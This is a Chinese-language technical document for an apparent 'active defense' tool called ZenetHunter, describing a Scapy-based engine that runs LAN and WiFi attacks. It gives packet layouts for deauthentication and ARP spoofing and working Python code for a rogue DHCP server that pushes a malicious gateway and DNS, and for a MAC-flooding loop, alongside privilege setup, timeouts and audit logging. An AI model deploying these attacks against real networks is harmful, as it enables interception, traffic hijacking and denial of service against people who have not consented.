# 攻击引擎技术文档

ZenetHunter 主动防御攻击引擎的实现细节。

⚠️ **敏感技术文档** - 仅限授权访问

---

## 概述

攻击引擎模块使用原始数据包操作提供主动防御技术的底层实现。所有实现都构建在 Scapy 之上，以实现跨平台兼容性和灵活性。

---

## 架构

```
┌─────────────────────────────────────────────┐
│          攻击引擎接口                        │
│              (base.py)                       │
└──────────────────┬──────────────────────────┘
                   │
        ┌──────────┴──────────┐
        │                     │
┌───────▼────────┐   ┌───────▼────────┐
│  ScapyEngine   │   │  DummyEngine   │
│   (scapy.py)   │   │   (dummy.py)   │
└────────────────┘   └────────────────┘
```

### 组件

1. **AttackEngine (抽象基类)**
   - 定义所有引擎实现的接口
   - 位置：`base.py`
   - 方法：`start_attack()`、`stop_attack()`、`scan_network()`

2. **ScapyAttackEngine (生产环境)**
   - 使用 Scapy 库的真实实现
   - 位置：`scapy.py`
   - 需要：Root/管理员权限
   - 平台：Linux、macOS、Windows

3. **DummyAttackEngine (测试)**
   - 用于测试的模拟实现
   - 位置：`dummy.py`
   - 无需特殊权限

---

## Scapy 引擎实现

### 核心功能

- **原始数据包操作**：直接控制所有数据包层
- **跨平台**：支持 Linux、macOS 和 Windows
- **权限管理**：自动能力检测
- **安全控制**：内置超时和紧急停止
- **平台特定优化**：每个操作系统的自定义代码路径

### 权限要求

#### Linux
```bash
# 选项 1：以 root 身份运行
sudo python -m backend.main

# 选项 2：添加 CAP_NET_RAW 能力
sudo setcap cap_net_raw+ep /path/to/python

# 验证能力
getcap /path/to/python
```

#### macOS
```bash
# 必须以 root 身份运行
sudo python -m backend.main

# 检查当前用户
id
# 应显示：uid=0(root)
```

#### Windows
```powershell
# 以管理员身份运行 PowerShell/CMD
# 右键 -> "以管理员身份运行"

# 或以编程方式检查
[Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains "S-1-5-32-544"
```

### 权限检查实现

```python
def check_permissions(self) -> bool:
    """检查是否有原始套接字操作的权限。"""
    try:
        # 检查是否以 root 身份运行
        if os.geteuid() == 0:
            return True

        # 在 Linux 上，检查 NET_RAW 能力
        if sys.platform == "linux":
            with open("/proc/self/status") as f:
                for line in f:
                    if line.startswith("CapEff:"):
                        cap_eff = int(line.split()[1], 16)
                        # NET_RAW 是能力 13
                        if (cap_eff >> 13) & 1:
                            return True

        return False
    except Exception:
        return False
```

---

## 攻击实现

### 1. WiFi 去认证 (KICK)

**技术细节**：
- 发送 802.11 去认证帧
- 原因代码：7（从未关联站接收的类 3 帧）
- 需要监控模式接口（或支持注入的接口）

**数据包结构**：
```
RadioTap 头（可变长度）
├─ 802.11 头
│  ├─ 帧控制（2字节）：类型=管理，子类型=去认证
│  ├─ 持续时间（2字节）
│  ├─ 地址 1（6字节）：目标 MAC
│  ├─ 地址 2（6字节）：AP MAC（伪造）
│  └─ 地址 3（6字节）：BSSID
└─ 去认证主体
   ├─ 原因代码（2字节）：7
   └─ FCS（4字节，自动）
```

### 2. ARP 欺骗 (BLOCK)

**技术细节**：
- 操纵 ARP 缓存条目
- 发送免费 ARP 回复
- 需要持续中毒

**数据包结构**：
```
以太网头（14字节）
├─ 目标 MAC（6字节）：目标
├─ 源 MAC（6字节）：攻击者
└─ 以太类型（2字节）：0x0806（ARP）

ARP 数据包（28字节）
├─ 硬件类型（2字节）：以太网（1）
├─ 协议类型（2字节）：IPv4（0x0800）
├─ 硬件大小（1字节）：6
├─ 协议大小（1字节）：4
├─ 操作码（2字节）：回复（2）
├─ 发送方 MAC（6字节）：攻击者
├─ 发送方 IP（4字节）：网关（伪造）
├─ 目标 MAC（6字节）：受害者
└─ 目标 IP（4字节）：网关
```

### 3. DHCP 欺骗 (DHCP_SPOOF)

**技术细节**：
- 监听 DHCP DISCOVER
- 响应恶意 DHCP OFFER
- 可指定自定义网关和 DNS

**实现**：
```python
async def _run_dhcp_spoof_attack(self, target_mac: str, duration: int):
    """执行 DHCP 欺骗攻击。"""
    def handle_dhcp(packet):
        if DHCP in packet and packet[DHCP].options[0][1] == 1:
            # 创建伪造的 DHCP Offer
            offer = (
                Ether(dst=packet[Ether].src, src=my_mac)
                / IP(src=fake_dhcp_ip, dst="255.255.255.255")
                / UDP(sport=67, dport=68)
                / BOOTP(
                    op=2,                    # BOOTP 回复
                    xid=packet[BOOTP].xid,   # 事务 ID
                    yiaddr="192.168.1.100",  # 提供的 IP
                    siaddr=fake_dhcp_ip,     # DHCP 服务器
                    chaddr=packet[BOOTP].chaddr
                )
                / DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", fake_dhcp_ip),
                    ("lease_time", 3600),
                    ("router", fake_dhcp_ip),      # 恶意网关
                    ("name_server", fake_dhcp_ip), # 恶意 DNS
                    "end"
                ])
            )
            sendp(offer, iface=iface, verbose=False)

    # 嗅探并响应
    sniff(filter="udp and port 67", prn=handle_dhcp, timeout=duration)
```

### 4. DNS 欺骗 (DNS_SPOOF)

**技术细节**：
- 拦截 DNS 查询（UDP 端口 53）
- 制作恶意 DNS 响应
- 与合法 DNS 服务器的竞争条件

### 5. MAC 泛洪 (MAC_FLOOD)

**技术细节**：
- 生成随机源 MAC 地址
- 淹没交换机 CAM 表
- 高数据包速率（100-1000 pps）

**实现**：
```python
async def _run_mac_flood_attack(self, target_mac: str, duration: int):
    """执行 MAC 泛洪攻击。"""
    import random

    while time.time() < end_time:
        # 生成随机 MAC
        fake_mac = ":".join([
            f"{random.randint(0, 255):02x}" for _ in range(6)
        ])

        # 发送带有伪造源的数据包
        flood_packet = (
            Ether(src=fake_mac, dst=target_mac)
            / IP() / ICMP()
        )

        await asyncio.to_thread(sendp, flood_packet, iface=iface)
        await asyncio.sleep(0.01)  # 100 pps
```

---

## 平台特定实现

### Linux

**优势**：
- 完全原始套接字支持
- 能力系统（CAP_NET_RAW）
- 最佳性能

**网络接口检测**：
```python
# 获取默认接口
iface = conf.iface  # 通常是 'eth0'、'wlan0' 等

# 获取网关
gw_route = conf.route.route("0.0.0.0")
gateway_ip = gw_route[2]
```

### macOS

**优势**：
- 良好的原始套接字支持
- 基于 BSD 的网络堆栈

**挑战**：
- 需要 root（无能力）
- 不同的接口命名（en0、en1）

**接口检测**：
```python
from app.core.engine.features_macos import MacOSNetworkFeatures

macos = MacOSNetworkFeatures()
gateway_ip = await macos.get_gateway_ip()
iface = await macos.get_default_interface()
```

### Windows

**优势**：
- Wincap/Npcap 支持

**挑战**：
- 有限的原始套接字支持
- 不同的接口 GUID
- 某些操作可能失败

---

## 安全机制

### 1. 操作超时

所有操作都有最大持续时间：
```python
max_duration = request.duration + 10
try:
    await asyncio.wait_for(
        self.engine.start_attack(mac, attack_type, duration),
        timeout=max_duration
    )
except TimeoutError:
    await self.engine.stop_attack(mac)
    raise
```

### 2. 紧急停止

操作可以随时取消：
```python
async def stop_attack(self, target_mac: str):
    """紧急停止机制。"""
    if target_mac in self._running_attacks:
        self._running_attacks[target_mac] = False
        # 引擎定期检查此标志
```

### 3. 速率限制

内置延迟防止网络泛洪：
```python
# ARP：2秒间隔
await asyncio.sleep(2)

# MAC 泛洪：10ms 间隔（最大 100 pps）
await asyncio.sleep(0.01)
```

---

## 测试

### 单元测试

```python
# tests/test_scapy_engine.py

async def test_permission_check():
    engine = ScapyAttackEngine()
    has_perms = engine.check_permissions()
    assert isinstance(has_perms, bool)

async def test_arp_spoof_packet():
    engine = ScapyAttackEngine()
    packet = engine._craft_arp_spoof_packet(
        target_mac="aa:bb:cc:dd:ee:ff",
        gateway_ip="192.168.1.1"
    )
    assert packet[ARP].op == 2
    assert packet[ARP].pdst == "192.168.1.1"
```

### 集成测试

```bash
# 需要 root 和测试网络
pytest tests/test_engine.py --run-integration --as-root
```

---

## 性能考虑

### 数据包速率限制

| 操作 | 速率 | 备注 |
|-----------|------|-------|
| ARP 欺骗 | 0.5 pps | 每 2 秒 |
| DHCP 欺骗 | 事件驱动 | 响应 DISCOVER |
| DNS 欺骗 | 事件驱动 | 响应查询 |
| MAC 泛洪 | 100 pps | 可通过强度配置 |
| 去认证 | 5 pps | 5 个突发，然后暂停 1 秒 |

### 内存使用

- **基础**：~50-100 MB（已加载 Scapy）
- **每个操作**：~10-20 MB（数据包缓冲区）
- **嗅探**：~100 MB（捕获缓冲区）

### CPU 使用

- **空闲**：<5%
- **活动操作**：10-30%
- **高强度泛洪**：50-80%

---

## 安全考虑

### 审计日志

所有操作都被记录：
```python
logger.info(
    f"[ScapyEngine] 在 {target_mac} 上启动 {attack_type}，"
    f"持续 {duration}秒"
)
```

### 权限验证

执行前始终检查：
```python
if not self.check_permissions():
    raise PermissionError("需要 Root/管理员权限")
```

### 安全默认值

- 最大持续时间：3600秒（1小时）
- 默认强度：5/10（中等）
- 退出时自动清理

---

## 故障排除

### 常见问题

1. **"权限被拒绝"错误**
   - 解决方案：以 root 身份运行或添加 CAP_NET_RAW

2. **"找不到接口"**
   - 解决方案：检查 `ip link` 或 `ifconfig` 输出

3. **数据包未发送**
   - 解决方案：检查防火墙规则，验证接口已启动

4. **高 CPU 使用率**
   - 解决方案：降低强度级别

---

## 参考资料

- [Scapy 文档](https://scapy.readthedocs.io/)
- [IEEE 802.11 规范](https://standards.ieee.org/standard/802_11-2020.html)
- [RFC 826 - ARP](https://tools.ietf.org/html/rfc826)
- [RFC 2131 - DHCP](https://tools.ietf.org/html/rfc2131)
- [Linux 能力](https://man7.org/linux/man-pages/man7/capabilities.7.html)

---

**⚠️ 这是高度敏感的技术文档。严禁未经授权的访问、复制或分发。**
